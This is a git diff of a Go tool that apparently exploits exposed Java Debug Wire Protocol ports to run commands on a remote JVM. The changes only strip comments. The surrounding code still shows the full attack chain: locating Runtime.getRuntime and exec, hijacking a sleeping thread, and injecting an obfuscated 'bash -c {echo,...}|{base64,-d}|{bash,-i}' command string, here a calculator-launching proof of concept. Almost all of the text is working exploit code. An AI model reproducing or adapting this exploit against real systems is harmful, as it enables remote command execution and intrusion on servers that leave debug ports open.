@@ -37,7 +37,7 @@ func main() {
 	if err != nil {
 		fmt.Printf("err = %v\n", err)
 	}
-	idSizes, err := debuggerCore.VMCommands().IDSizes() // 这里的 IDsize 没有用起来
+	idSizes, err := debuggerCore.VMCommands().IDSizes()
 	if err != nil {
 		fmt.Printf("err = %v\n", err)
 		return
@@ -50,7 +50,7 @@ func main() {
 		}
 	}
 	fmt.Println(fmt.Sprintf("[+] Found Runtime class: id=%v", runtimeClas.ReferenceTypeID))
-	methods, _ := debuggerCore.VMCommands().AllMethods(runtimeClas.ReferenceTypeID) // 10d9
+	methods, _ := debuggerCore.VMCommands().AllMethods(runtimeClas.ReferenceTypeID)
 	getRuntimeMethod := common.GetMethodByName(methods, "getRuntime")
 	if getRuntimeMethod == nil {
 		return
@@ -63,7 +63,7 @@ func main() {
 	var threadID uint64
 	for _, thread := range threads.Threads {
 		threadStatus, _ := debuggerCore.VMCommands().StatusThread(thread.ObjectID)
-		if threadStatus.ThreadStatus == 2 { // thread sleeping
+		if threadStatus.ThreadStatus == 2 {
 			threadID = thread.ObjectID
 			break
 		}
@@ -76,16 +76,14 @@ func main() {
 	buf := make([]byte, 128)
 	var rId int32
 	var tId uint64
-	num, _ := conn.Read(buf) // 好像和 read那个 会有一个阻塞 然后就会导致读不到
+	num, _ := conn.Read(buf)
 	if num != 0 {
 		replyData := buf[:num]
 		rId, tId = common.ParseEvent(replyData, reply.RequestID, idSizes)
-		//fmt.Println(hex.EncodeToString(replyData))
 	}
 	fmt.Println(fmt.Sprintf("[+] Received matching event from thread %v", tId))
 	debuggerCore.VMCommands().ClearCommand(rId)
 
-	// 命令执行
 	// Step 1 allocating string
 	createStringReply, _ := debuggerCore.VMCommands().CreateString("bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}")
 	if createStringReply == nil {
@@ -102,7 +100,6 @@ func main() {
 	fmt.Println(fmt.Sprintf("[+] Runtime.getRuntime() returned context id:%v", invokeStaticMethodReply.ContextID))
 
 	// step 3
-	// find exec method
 	execMethod := common.GetMethodByName(methods, "exec")
 	if execMethod == nil {
 		return
